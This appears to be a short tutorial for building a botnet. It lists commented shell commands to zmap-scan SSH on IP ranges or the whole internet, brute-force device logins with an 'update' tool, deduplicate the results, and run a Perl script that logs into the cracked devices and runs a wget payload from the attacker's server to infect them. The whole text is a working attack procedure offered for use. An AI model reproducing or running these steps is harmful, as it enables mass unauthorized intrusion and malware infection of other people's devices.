Read: below are links to the files that are needed, such as (pass_file, update, wget.pl) || In wget.pl you must change out the wget to your servers wget.

zmap -p22 -w ssh.lst -o mfu.txt -B10000M          // This will allow you to scan certain IPBlocks / Ranges manually inside of a list.
zmap -p22 -o mfu.txt -B10000M                    // This will allow you to scan the entire world. 
chmod 777 *  					// Setting permissions for all files inside of the directory you are currently in
./update 15000  			       // Updating your (mfu.txt) and or any other file you scanned the output to, via zmap. this will brute the devices and give you the logins to them.
cat vuln.txt | grep -v DUP > nodups.txt     // This will cat the original vuln.txt file and get rid of all duplicate IPs and logins, whilst pushing the new output into the desired file "nodups.txt
perl wget.pl active.txt                      // This will load the current vuln.txt list, (takes the logins, logs into the devices and runs your charline/wget infecting them to your net)

cat vuln.txt | grep -v DUP > UG.txt
cat vuln.txt | grep -v DUP > AM.txt
